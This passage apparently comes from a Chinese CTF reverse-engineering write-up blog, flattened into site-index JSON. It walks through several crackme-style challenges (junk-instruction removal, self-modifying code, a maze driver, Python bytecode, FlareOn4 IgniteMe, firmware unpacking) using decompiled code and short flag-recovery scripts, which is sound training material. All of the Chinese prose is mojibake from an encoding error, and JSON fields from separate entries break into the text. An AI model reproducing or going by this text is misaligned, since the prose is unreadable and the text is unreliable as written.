¹æ®RXçš„wpå¤ç°è¿˜é‡åˆ°äº†å¥½å¤šé—®é¢˜ï¼ˆï¼ˆ idaæ‰“å¼€åªèƒ½çœ‹åˆ°startå‡½æ•°ï¼Œç‚¹å¼€offset mainçœ‹åˆ°mainå‡½æ•°å…¨æ˜¯çº¢çš„ï¼Œåˆ†æé”™è¯¯ 400BB1 jmpé‚£ä¸€è¡Œæ˜æ˜¾æœ‰èŠ±æŒ‡ä»¤ï¼Œloc_400BB1è‡ªå·±è·³åˆ°è‡ªå·±ï¼Œå…ˆæŒ‰uå–æ¶ˆå®šä¹‰ï¼ŒBB2é‚£ä¸€è¡ŒæŒ‰cè½¬æ¢ä¸ºcodeï¼ŒBB1patchæˆnop BB7è·³è½¬åˆ°loc_400BBFï¼Œç„¶åèƒ¡ä¹±æ“ä½œä¸€é€šå°±retnäº† å› ä¸ºreturnä»¥åè¦æ‰§è¡ŒBBCè¿™ä¸€è¡Œï¼Œæ‰€ä»¥BBCè¿™ä¸€è¡Œåº”è¯¥ä¹Ÿæ˜¯èŠ±æŒ‡ä»¤ æŒ‰uå–æ¶ˆå®šä¹‰ï¼ŒæŠŠBBC patchæ‰ï¼Œå‰©ä¸‹ä¸¤è¡Œè½¬æ¢æˆcodeï¼Œ400CBAé‚£ä¸€è¡ŒåŒç† 400D04å’Œä¸Šé¢BB1åŒç†ï¼Œä¸€æ ·ææ‰ D14ä¸‹é¢è¿™å‡ è¡Œä¸€å †ä¹±æ•°æ®ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨ï¼Œå…ˆä¸ç®¡ å›åˆ°mainå‡½æ•°å¼€å¤´æŒ‰påˆ›å»ºå‡½æ•°ï¼ŒæˆåŠŸï¼ŒF5å´å‡ºç°æŠ¥é”™ æ˜¯spæŒ‡é’ˆå‡ºäº†é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡Options-\u003eGeneral-\u003eDisassemblyå³è¾¹å‹¾ä¸Šstack pointer å¯ä»¥æ˜æ˜¾çœ‹åˆ°loc_400BBFå‡½æ•°ä¸­çš„spæŒ‡é’ˆå€¼å‡ºäº†é—®é¢˜ è¿™æ ·çœ‹æ¥ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸ºäº†æ‰°ä¹±spå­˜åœ¨çš„ï¼Œç›´æ¥ä»BB7åˆ°BD0å…¨patchæ‰ åŒç†CB5åˆ°CCEä¹Ÿå…¨patchæ‰ ä½†è¿™æ—¶idaæŠŠmainå‡½æ•°æ–­åœ¨äº†CB9è¿™ä¸€è¡Œ å¯ä»¥å›åˆ°mainå‡½æ•°å¼€å§‹æŒ‰uå–æ¶ˆå®šä¹‰ï¼Œç„¶åæŒ‰cé‡æ–°è½¬æ¢ä¸ºcode ç„¶åç»ˆäºå¯ä»¥å¿«ä¹åœ°F5äº†,mainå‡½æ•°çœŸå®¹ï¼š void __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+4h] [rbp-23Ch] __int64 input[4]; // [rsp+10h] [rbp-230h] BYREF char v5[520]; // [rsp+30h] [rbp-210h] BYREF unsigned __int64 v6; // [rsp+238h] [rbp-8h] v6 = __readfsqword(0x28u); memset(v5, 0, 512uLL); input[0] = 0LL; input[1] = 0LL; input[2] = 0LL; input[3] = 0LL; if ( (unsigned int)sub_4008B9((__int64)v5) == -1 ) exit(0LL); read(0LL, input, 19LL); qword_602048 = (__int64)sub_400A69; mprotect((unsigned int)main \u0026 0xFFFFC000, 0x10uLL, 7uLL); for ( i = 0; i \u003c= 9; ++i ) *(_BYTE *)(qword_602048 + i) ^= *((_BYTE *)input + i % 5); if ( (unsigned int)sub_400A69((int)v5, (__int64)input + 5, (unsigned __int16)v5) ) write(1LL, \"Cong!\\n\", 6LL); exit(0LL); } 17è¡Œåˆ›å»ºäº†ä¸€ä¸ªsub_400A69å‡½æ•°æ®µçš„æŒ‡é’ˆ 18è¡Œmprotectå‡½æ•°å°†sub_400A69æ®µä»£ç çš„æƒé™æ”¹ä¸º7ï¼ˆå³rwxï¼‰ ç„¶å20è¡Œä¿®æ”¹äº†sub_400A69çš„ä»£ç ï¼Œä¸inputå‰5ä½ï¼ˆn1ctfï¼‰å¼‚æˆ–ï¼Œå³SMCï¼Œå…ˆå†™ä¸ªè„šæœ¬è¿˜åŸä¸€ä¸‹æ­£ç¡®çš„ä»£ç  from ida_bytes import * key = \"n1ctf\" for i in range(10): patch_byte(0x400A69+i,get_byte(0x400A69+i)^ord(key[i%5])) è¿˜åŸä¹‹åF5è¿˜æ˜¯å¤±è´¥ï¼ŒåŸå› æ˜¯æœ‰å’Œmainå‡½æ•°ä¸€æ ·çš„èŠ±æŒ‡ä»¤å’Œæ‰°ä¹±spçš„ä»£ç ï¼Œä¸€æ ·å¤„ç†åå¾—åˆ°å‡½æ•° __int64 __fastcall sub_400A69(__int64 a1, __int64 a2) { __int64 v2; // rbp int i; // [rsp+14h] [rbp-2Ch] char v5[14]; // [rsp+18h] [rbp-28h] BYREF unsigned __int64 v6; // [rsp+30h] [rbp-10h] __int64 v7; // [rsp+38h] [rbp-8h] v7 = v2; v6 = __readfsqword(0x28u); v5[0] = 53; v5[1] = 45; v5[2] = 17; v5[3] = 26; v5[4] = 73; v5[5] = 125; v5[6] = 17; v5[7] = 20; qmemcpy(\u0026v5[8], \"+;\u003e=\u003c_\", 6); for ( i = 0; i \u003c= 13; ++i ) { if ( v5[i] != ((*(char *)(i + a1) + 2) ^ *(char *)(i + a2)) ) return 0LL; } return 1LL; } é‡æ–°è¿›mainå‡½æ•°çœ‹ä¸€ä¸‹ä¼ è¿›æ¥çš„å‚æ•°ï¼Œè¿™é‡Œéœ€è¦å†æŒ‰ä¸€ä¸‹F5ï¼Œè®©idaæ ¹æ®ä¿®å¤åçš„ä»£ç é‡æ–°åˆ†æä¸€ä¸‹ void __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+4h] [rbp-23Ch] __int64 input[4]; // [rsp+10h] [rbp-230h] BYREF char v5[520]; // [rsp+30h] [rbp-210h] BYREF unsigned __int64 v6; // [rsp+238h] [rbp-8h] v6 = __readfsqword(0x28u); memset(v5, 0, 0x200uLL); input[0] = 0LL; input[1] = 0LL; input[2] = 0LL; input[3] = 0LL; if ( (unsigned int)sub_4008B9((__int64)v5) == -1 ) exit(0LL); read(0LL, input, 19LL); qword_602048 = (__int64)sub_400A69; mprotect((unsigned int)main \u0026 0xFFFFC000, 16LL, 7LL); for ( i = 0; i \u003c= 9; ++i ) *(_BYTE *)(qword_602048 + i) ^= *((_BYTE *)input + i % 5); if ( (unsigned int)sub_400A69((__int64)v5, (__int64)input + 5) ) write(1LL, \"Cong!\\n\", 6LL); exit(0LL); } ç°åœ¨åªéœ€æ±‚å‡ºmainå‡½æ•°é‡Œçš„v5å³sub_400A69é‡Œçš„a1ï¼Œå³å¯è§£å‡ºflag sub_4008B9é‡Œé¢å®ç°å¤ªå¤æ‚äº†ï¼Œæƒ³æ³•æ˜¯åŠ¨è°ƒå¾—åˆ°v5ï¼Œä½†è¿™é‡Œé¢æœ‰ptraceåè°ƒè¯• åˆå› ä¸ºåè°ƒè¯•åœ¨è¾“å…¥ä¹‹å‰ï¼Œæ‰€ä»¥å¯ä»¥å…ˆè¿è¡Œåˆ°è¾“å‡ºï¼Œç„¶åå†attachä¸Šå» è¿™é‡Œæˆ‘åšçš„æ—¶å€™åªæœ‰rootç”¨æˆ·è¿è¡Œå¯ä»¥ï¼Œæ™®é€šç”¨æˆ·ä¼šæŠ¥é”™æƒé™ä¸è¶³ä»€ä¹ˆçš„ï¼Œå…·ä½“åŸå› ä¸æ¸…æ¥š attachä¸Šä¹‹åmainå‡½æ•°ç‚¹è¿›å»v5ï¼Œå¯ä»¥çœ‹åˆ°éœ€è¦çš„å‰14ä½å°±æ˜¯Linux Version æœ€åå†™è„šæœ¬è§£flag #include\u003cstdio.h\u003e char en_flag[]={53,45,17,26,73,125,17,20,'+',';','\u003e','=','\u003c','_'}; char v5[]=\"Linux Version \"; char flag[100]; int main(){ for(int i=0;i\u003c=13;i++){ flag[i]=(v5[i]+2)^en_flag[i]; } puts(flag); } // {Fam3_Is_NULL} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:5:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 XNUCA 2020 Unravel MFC æ²¡æœ‰æœ€éš¾ï¼Œåªæœ‰æ›´éš¾ï¼Œè¿™å‘¨å·²ç»åšå¾—å¿ƒæ€çˆ†ç‚¸äº†ï¼ˆï¼ˆ å¼€å§‹è¿æœ‰ç”¨çš„å‡½æ•°éƒ½æ‰¾ä¸åˆ°ï¼Œå®˜æ–¹wpå†™å¾—ä¹Ÿæœ‰äº¿ç‚¹ç®€ç•¥ï¼Œæäº†å‡ ä¸ªå°æ—¶ä¹Ÿè¿›å±•ä¸å¤§ å…ˆæ”¾æ”¾å§ï¼Œåé¢å†å¡«å‘ ç¬¬ä¸ƒå‘¨ ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:6:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—00 GUETCTF 2019 number game æ‹’ ç» æš´ åŠ› dieæŸ¥ï¼ŒElf64ï¼Œè¿›ida mainå‡½æ•°ä¸œè¥¿æœ‰ç‚¹å¤šï¼Œä¸€ä¸ªä¸€ä¸ªçœ‹ unsigned __int64 __fastcall main(int a1, char **a2, char **a3) { _QWORD *v4; // [rsp+8h] [rbp-38h] __int64 v5; // [rsp+10h] [rbp-30h] BYREF __int16 v6; // [rsp+18h] [rbp-28h] __int64 v7; // [rsp+20h] [rbp-20h] BYREF __int16 v8; // [rsp+28h] [rbp-18h] char v9; // [rsp+2Ah] [rbp-16h] unsigned __int64 v10; // [rsp+38h] [rbp-8h] v10 = __readfsqword(0x28u); v5 = 0LL; v6 = 0; v7 = 0LL; v8 = 0; v9 = 0; __isoc99_scanf(\"%s\", \u0026v5); if ( (unsigned int)sub_4006D6((const char *)\u0026v5) ) { v4 = sub_400758((__int64)\u0026v5, 0, 10u); sub_400807((__int64)v4, (__int64)\u0026v7); v9 = 0; sub_400881(\u0026v7); if ( (unsigned int)sub_400917() ) { puts(\"TQL!\"); printf(\"flag{\"); printf(\"%s\", (const char *)\u0026v5); puts(\"}\"); } else { puts(\"your are cxk!!\"); //cai xu kun??? } } return __readfsqword(0x28u) ^ v10; } sub_4006D6ï¼ˆï¼‰åˆ¤æ–­è¾“å…¥æ˜¯å¦ä¸ºæ•°å­—0-4ï¼Œä¸”å…±10ä½ å‰©ä¸‹å‡ ä¸ªå‡½æ•°å¯ä»¥å€’ç€çœ‹ ç¬¬äºŒä¸ªifé‡Œé¢sub_4006D6ï¼ˆï¼‰çš„åˆ¤æ–­æ˜¯ä¸€ä¸ª5*5çš„æ•°ç‹¬é€»è¾‘ 1 4 # 2 3 3 0 # 1 # 0 # 2 3 # # 3 # # 0 4 2 # # 1 æ‰‹åŠ¨å¡«ä¸€ä¸‹æ˜¯0421421430 sub_400881(\u0026v7)å°±æ˜¯ç”¨ä¸Šé¢çš„å€¼å¡«æ•°ç‹¬å¾…æ£€éªŒ sub_400807ï¼ˆï¼‰åº”è¯¥åªæ˜¯å¤åˆ¶äº†ä¸€ä¸‹ï¼Œv4-\u003ev7ï¼ŒåŠ¨è°ƒéªŒè¯ç¡®å®å•¥ä¹Ÿæ²¡å¹² ä¸»è¦åŠ å¯†å‡½æ•°æ˜¯sub_400758ï¼ˆï¼‰ _QWORD *__fastcall sub_400758(__int64 a1, int a2, unsigned int a3) { char v5; // [rsp+1Fh] [rbp-11h] _QWORD *v6; // [rsp+28h] [rbp-8h] v5 = *(_BYTE *)(a2 + a1); if ( v5 == ' ' || v5 == '\\n' || a2 \u003e= (int)a3 ) return 0LL; v6 = malloc(24uLL); *(_BYTE *)v6 = v5; v6[1] = sub_400758(a1, 2 * a2 + 1, a3); v6[2] = sub_400758(a1, 2 * (a2 + 1), a3); return v6; } é€’å½’ï¼Œ2 * a2 + 1ï¼Œ2 * (a2 + 1)ï¼Œç¬¬ä¸€æ„Ÿè§‰æ˜¯äºŒå‰æ ‘è®¿é—®å·¦å³å­æ ‘ï¼Œæ²¡ç‚¹OIåŸºç¡€éƒ½åšä¸äº†é€†å‘ï¼ˆï¼ˆ åŠ¨è°ƒéªŒè¯ä¸€ä¸‹ï¼Œå®é™…æ˜¯é€šè¿‡å¯¹inputæŒ‰æ•°ç»„ä¸‹æ ‡å»ºç«‹äºŒå‰æ ‘ï¼Œç„¶åè¾“å‡ºä¸­åºéå† äºæ˜¯å¯ä»¥æ ¹æ®0421421430æ‰‹åŠ¨å»ºæ ‘ï¼Œè¿™é‡Œå› ä¸ºé»˜è®¤äºŒå‰æ ‘ä»å·¦åˆ°å³ç”Ÿé•¿ï¼Œæ‰€ä»¥ä¿è¯äº†ç­”æ¡ˆçš„å”¯ä¸€æ€§ 1 1 3 4 2 4 0 0 2 4 //flagï¼š1134240024 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:6:1","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 HITCTF 2020 Node æ²¡æƒ³æ³•ï¼Œæ²¡æ€è·¯ï¼Œverifyå‡½æ•°ä¸Šåƒè¡Œä»£ç åŠé€€ï¼ˆï¼ˆ åªèƒ½æ‹œè¯»RXçš„wp åŸæ¥åªè¦æ‰¾åˆ°345è¡Œä¸€é€†å°±è¡Œwhile ( (char)(*((_BYTE *)v124 + v37) ^ 'r') + 'h' == key[v37] ) #include\u003cstdio.h\u003e unsigned char key[] = { 0x93, 0x85, 0x69, 0x82, 0x83, 0x84, 0x85, 0xC7, 0x69, 0xBA, 0x6D, 0x7B, 0x84, 0x6E, 0xBA, 0x7B, 0xBA, 0x7D, 0x83, 0x68, 0x86, 0x7C, 0x68, 0x83, 0x7F, 0x84, 0x7E, 0xC6, 0x6D, 0x6F, 0x6D, 0x6F }; char flag[100]; int main(){ for(int i=0;i\u003c32;i++){ flag[i]=(key[i]-'h')^'r'; } puts(flag); } //Yoshino-s want a girlfriend,wuwu éš¾ç‚¹åœ¨äºæ ¹æœ¬æ‰¾ä¸åˆ° æ ¹æ®bbçš„wpè·å¾—æ€è·¯ï¼Œæ—¢ç„¶é€†å‡ºæ¥çš„ä¸œè¥¿è¦ç”¨æ¥åšwebï¼Œé‚£ä¹ˆä¸€å®šåœ¨exportçª—å£èƒ½æ‰¾åˆ° æ‰“å¼€exportçª—å£å¾ˆæ˜¾çœ¼åœ°å°±èƒ½çœ‹åˆ°key æŸ¥äº¤å‰å¼•ç”¨å°±èƒ½æ‰¾åˆ°verifyå‡½æ•°ï¼Œå°±èƒ½å®šä½345è¡Œï¼Œé—®é¢˜è§£å†³ï¼Œåˆé•¿è§è¯†äº† ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:7:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—02 GKCTF 2020 BabyDriver dieæŸ¥ï¼ŒPE64ï¼Œè¿›ida ç¿»stringçª—å£çœ‹åˆ°äº† .data:0000000140003000 000000E1 C ****************o.*..*......*..**.**...**.*.*.***.****.**.*.*.***.......*.*.*****..***..*..**..***....**....**....***..**.***.***....**...***.**********..***......#****.***************************** æ‰“å¼€æœç„¶æ˜¯ä¸ªåœ°å›¾ï¼Œå…±225byte åˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯15*5ï¼Œåé¢çœ‹ä»£ç è§‰å¾—ä¸å¯¹ï¼Œæœ€åç¡®å®šæ˜¯14*16 **************** o.*..*......*..* *.**...**.*.*.** *.****.**.*.*.** *...**....*.*.** ***..***.**.*..* *.**.***.**.**.* *.**.******.**.* *.**....***.**.* *.*****.***....* *...***.******** **..***......#** **.************* **************** æ ¹æ®åœ°å›¾æŸ¥äº¤å‰å¼•ç”¨å®šä½èµ°åœ°å›¾é€»è¾‘å‡½æ•° __int64 __fastcall sub_140001380(__int64 a1, __int64 a2) { __int64 v3; // rdi __int64 v4; // rax int v5; // ecx __int16 *v6; // rsi __int64 v7; // rbp __int16 v8; // dx char v9; // dl const CHAR *v10; // rcx if ( *(int *)(a2 + 48) \u003e= 0 ) { v3 = *(_QWORD *)(a2 + 24); v4 = *(_QWORD *)(a2 + 56) \u003e\u003e 3; if ( (_DWORD)v4 ) { v5 = dword_1400030E4; v6 = (__int16 *)(v3 + 2); v7 = (unsigned int)v4; while ( *(_WORD *)(v3 + 4) ) { LABEL_28: v6 += 6; if ( !--v7 ) goto LABEL_29; } byte_140003000[v5] = 46; v8 = *v6; if ( *v6 == 0x17 ) { if ( (v5 \u0026 0xFFFFFFF0) != 0 ) { v5 -= 16; goto LABEL_21; } v5 += 208; dword_1400030E4 = v5; } if ( v8 == 0x25 ) { if ( (v5 \u0026 0xFFFFFFF0) != 208 ) { v5 += 16; goto LABEL_21; } v5 -= 208; dword_1400030E4 = v5; } if ( v8 == 0x24 ) { if ( (v5 \u0026 0xF) != 0 ) { --v5; goto LABEL_21; } v5 += 15; dword_1400030E4 = v5; } if ( v8 != 0x26 ) goto LABEL_22; if ( (v5 \u0026 0xF) == 15 ) v5 -= 15; else ++v5; LABEL_21: dword_1400030E4 = v5; LABEL_22: v9 = byte_140003000[v5]; if ( v9 == 42 ) { v10 = \"failed!\\n\"; } else { if ( v9 != 35 ) { LABEL_27: byte_140003000[v5] = 111; goto LABEL_28; } v10 = \"success! flag is flag{md5(input)}\\n\"; } dword_1400030E4 = 16; DbgPrint(v10); v5 = dword_1400030E4; goto LABEL_27; } } LABEL_29: if ( *(_BYTE *)(a2 + 65) ) *(_BYTE *)(*(_QWORD *)(a2 + 184) + 3i64) |= 1u; return *(unsigned int *)(a2 + 48); } ä¸Šä¸‹å·¦å³é€»è¾‘å®¹æ˜“çœ‹å‡ºæ¥ï¼Œä½†å€¼0x17,0x25ä»€ä¹ˆçš„å¤ªå¥‡æ€ªäº† å·çœ‹å¸ˆå‚…ä»¬çš„wpçŸ¥é“äº†åŸæ¥æ˜¯é”®ç›˜æ‰«æç ï¼Œç²˜ä¸ªé“¾æ¥ 0x17-i-up 0x24-j-left 0x25-k-down 0x26-l-right æ‰‹åŠ¨èµ°ä¸€ä¸‹ï¼šlkkkllklkkklllkkklllll ç»“æœä¸å¯¹ï¼Ÿï¼Ÿå¥½å§å¾—å…¨å¤§å†™å†æ±‚md5 æœ€ç»ˆflagï¼šflag{403950a6f64f7fc4b655dea696997851} ç¬¬å…­å‘¨ ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:7:1","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—00 PyDis é™„ä»¶æ˜¯pycï¼Œå…ˆæƒ³åˆ°uncompyle6 C:\\Users\\DX3906\\Desktop\\t1\u003euncompyle6 pyre.cpython-39.pyc\u003e2.py # Unsupported bytecode in file pyre.cpython-39.pyc # Unsupported Python version, 3.9.0, for decompilation 3.9ä¸æ”¯æŒï¼Œç—›è‹¦å¼€å§‹ import dis,marshal f=open(\"pyre.cpython-39.pyc\",\"rb\").read() code = marshal.loads(f[16:]) dis.dis(code) å…ˆæŠ„å«æ ‘å¸ˆå‚…çš„ä»£ç å¾—å­—èŠ‚ç  1 0 BUILD_LIST 0 2 LOAD_CONST 0 ((178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163)) 4 LIST_EXTEND 1 6 STORE_NAME 0 (magic) 2 8 LOAD_NAME 1 (input) 10 LOAD_CONST 1 ('flag \u003e\u003e\u003e ') 12 CALL_FUNCTION 1 14 STORE_NAME 2 (inp) 4 16 LOAD_NAME 3 (list) 18 LOAD_NAME 2 (inp) 20 CALL_FUNCTION 1 22 STORE_NAME 4 (flag) 5 24 LOAD_NAME 5 (len) 26 LOAD_NAME 4 (flag) 28 CALL_FUNCTION 1 30 LOAD_NAME 5 (len) 32 LOAD_NAME 0 (magic) 34 CALL_FUNCTION 1 36 COMPARE_OP 3 (!=) 38 POP_JUMP_IF_FALSE 54 6 40 LOAD_NAME 6 (print) 42 LOAD_CONST 2 ('qwq') 44 CALL_FUNCTION 1 46 POP_TOP 7 48 LOAD_NAME 7 (exit) 50 CALL_FUNCTION 0 52 POP_TOP 9 \u003e\u003e 54 LOAD_NAME 8 (range) 56 LOAD_NAME 5 (len) 58 LOAD_NAME 4 (flag) 60 CALL_FUNCTION 1 62 LOAD_CONST 3 (2) 64 BINARY_FLOOR_DIVIDE 66 CALL_FUNCTION 1 68 GET_ITER \u003e\u003e 70 FOR_ITER 54 (to 126) 72 STORE_NAME 9 (i) 10 74 LOAD_NAME 4 (flag) 76 LOAD_CONST 3 (2) 78 LOAD_NAME 9 (i) 80 BINARY_MULTIPLY 82 LOAD_CONST 4 (1) 84 BINARY_ADD 86 BINARY_SUBSCR 88 LOAD_NAME 4 (flag) 90 LOAD_CONST 3 (2) 92 LOAD_NAME 9 (i) 94 BINARY_MULTIPLY 96 BINARY_SUBSCR 98 ROT_TWO 100 LOAD_NAME 4 (flag) 102 LOAD_CONST 3 (2) 104 LOAD_NAME 9 (i) 106 BINARY_MULTIPLY 108 STORE_SUBSCR 110 LOAD_NAME 4 (flag) 112 LOAD_CONST 3 (2) 114 LOAD_NAME 9 (i) 116 BINARY_MULTIPLY 118 LOAD_CONST 4 (1) 120 BINARY_ADD 122 STORE_SUBSCR 124 JUMP_ABSOLUTE 70 12 \u003e\u003e 126 BUILD_LIST 0 128 STORE_NAME 10 (check) 14 130 LOAD_NAME 8 (range) 132 LOAD_NAME 5 (len) 134 LOAD_NAME 4 (flag) 136 CALL_FUNCTION 1 138 CALL_FUNCTION 1 140 GET_ITER \u003e\u003e 142 FOR_ITER 26 (to 170) 144 STORE_NAME 9 (i) 15 146 LOAD_NAME 10 (check) 148 LOAD_METHOD 11 (append) 150 LOAD_NAME 12 (ord) 152 LOAD_NAME 4 (flag) 154 LOAD_NAME 9 (i) 156 BINARY_SUBSCR 158 CALL_FUNCTION 1 160 LOAD_CONST 5 (222) 162 BINARY_XOR 164 CALL_METHOD 1 166 POP_TOP 168 JUMP_ABSOLUTE 142 17 \u003e\u003e 170 LOAD_NAME 8 (range) 172 LOAD_NAME 5 (len) 174 LOAD_NAME 0 (magic) 176 CALL_FUNCTION 1 178 CALL_FUNCTION 1 180 GET_ITER \u003e\u003e 182 FOR_ITER 34 (to 218) 184 STORE_NAME 9 (i) 18 186 LOAD_NAME 10 (check) 188 LOAD_NAME 9 (i) 190 BINARY_SUBSCR 192 LOAD_NAME 0 (magic) 194 LOAD_NAME 9 (i) 196 BINARY_SUBSCR 198 COMPARE_OP 3 (!=) 200 POP_JUMP_IF_FALSE 182 19 202 LOAD_NAME 6 (print) 204 LOAD_CONST 2 ('qwq') 206 CALL_FUNCTION 1 208 POP_TOP 20 210 LOAD_NAME 7 (exit) 212 CALL_FUNCTION 0 214 POP_TOP 216 JUMP_ABSOLUTE 182 22 \u003e\u003e 218 LOAD_NAME 6 (print) 220 LOAD_CONST 6 ('happy new year!') 222 CALL_FUNCTION 1 224 POP_TOP 226 LOAD_CONST 7 (None) 228 RETURN_VALUE å‚è€ƒï¼šæ­»ç£•å­—èŠ‚ç  pythonå®˜æ–¹æ–‡æ¡£ åˆ†æé€»è¾‘ å¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€ï¼ˆè¿˜æ˜¯ä¹ æƒ¯å†™c #include\u003cstdio.h\u003e char magic[]={178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163}; char flag[100]; int main(){ scanf(\"%s\",flag); for(int i=0;i\u003c8;i++){ char x=flag[2*i]; flag[2*i]=flag[2*i+1]; flag[2*i+1]=x; } for(int i=0;i\u003c17;i++){ flag[i]^=222; if(flag[i]!=magic[i]){ puts(\"wrong\"); return 0; } } puts(\"write\"); } å†™è„šæœ¬è§£å¯† #include\u003cstdio.h\u003e char en_flag[]={178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163}; int main(){ for(int i=0;i\u003c17;i++){ en_flag[i]^=222; } for(int i=0;i\u003c8;i++){ char x=en_flag[2*i]; en_flag[2*i]=en_flag[2*i+1]; en_flag[2*i+1]=x; } puts(en_flag); } //flag{hapi_new_ya} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:7:2","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—01 FlareOn4 IgniteMe dieæŸ¥ï¼Œæ— å£³ï¼ŒPE32ï¼Œè¿›ida ä¸»å‡½æ•°é•¿è¿™æ · void __noreturn start() { DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 0x13u, \u0026NumberOfBytesWritten, 0); sub_4010F0(NumberOfBytesWritten); if ( sub_401050() ) WriteFile(dword_403074, aG00dJ0b, 0xAu, \u0026NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 0x24u, \u0026NumberOfBytesWritten, 0); ExitProcess(0); } sub_4010F0()è¿™ä¸ªå‡½æ•°å¥½åƒä»€ä¹ˆä¹Ÿæ²¡å¹² ä¸»è¦åŠ å¯†åœ¨sub_401050() int sub_401050() { int v1; // [esp+0h] [ebp-Ch] int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v1 = sub_401020(byte_403078); v4 = sub_401000(); for ( i = v1 - 1; i \u003e= 0; --i ) { byte_403180[i] = v4 ^ byte_403078[i]; v4 = byte_403078[i]; } for ( j = 0; j \u003c 0x27; ++j ) { if ( byte_403180[j] != (unsigned __int8)byte_403000[j] ) return 0; } return 1; } çœ‹ä¸€ä¸‹é‡Œé¢ä»£ç èƒ½çŒœå‡ºæ¥sub_401020()å°±æ˜¯strlen() v4ç›´æ¥åŠ¨è°ƒå°±æ˜¯0x4 å†™è„šæœ¬è§£å¯† #include\u003cstdio.h\u003e char en_flag[]={13, 38,73, 69, 42, 23, 120, 68, 43, 108,93, 94, 69, 18, 47, 23, 43, 68, 111, 110,86, 9, 95, 69, 71, 115, 38, 10, 13, 19,23, 72, 66, 1, 64, 77, 12, 2, 105,0}; char flag[1000]; int main(){ char V4=4; for(int i=39;i\u003e=0;i--){ flag[i]=en_flag[i]^V4; V4=flag[i]; } puts(flag); } //flag;{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:8:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 BUUCTF Firmware è¿™é¢˜éš¾ç‚¹åœ¨äºå·¥å…·çš„å®‰è£…ï¼ˆï¼ˆ è·Ÿç€å«æ ‘å¸ˆå‚…çš„wpèµ° windowsæ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥å¼€è™šæ‹Ÿæœºå…ˆè£…binwalk,è§‰å¾—æ…¢å¯ä»¥æ¢ä¸ªæº git clone https://github.com/devttys0/binwalk cd binwalk python setup.py install å…ˆbinwalk -e æ‹†åŒ…ï¼Œå››ä¸ªæ–‡ä»¶ï¼ŒæŒ¨ä¸ªfileå‘½ä»¤æŸ¥çœ‹ æœ‰ç”¨çš„å°±æ˜¯120200.squashfsï¼Œè¿™é‡Œè¦ç”¨ firmware-mod-kit çš„ unsquashfs_all.shå·¥å…· ç„¶åå°±é‡åˆ°äº†å’Œbbå¸ˆå‚…ä¸€æ ·çš„é—®é¢˜ï¼ŒæŒç»­ç—›è‹¦é¢å…· å¹¸å¥½RXç¥æ˜¯ä¸‡èƒ½çš„ å‘ç°é—®é¢˜æ˜¯githubä»“åº“çš„æºä»£ç æœ‰é—®é¢˜ æ¢ä¸€ä¸ªä»“åº“ä¸€åˆ‡æ­£å¸¸äº† git clone https://github.com/rampageX/firmware-mod-kit.git cd firmware-mod-kit/src ./configure make åˆ©ç”¨uncramfs_all.shæ‹†120200.squashfs 